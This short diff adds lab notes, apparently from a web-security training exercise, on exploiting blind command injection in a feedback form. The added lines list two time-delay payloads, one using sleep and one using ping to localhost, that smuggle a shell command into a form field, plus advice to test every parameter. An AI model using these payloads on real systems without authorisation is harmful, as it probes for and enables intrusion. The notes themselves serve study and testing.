@@ -6,3 +6,7 @@ Target Goal - Exploit blind command injection in the feedback function.
 
 Analysis:
 
+use & sleep 10 #
+or & ping -c 10 127.0.0.1 #
+
+check all parameters to detect which is vulnerable
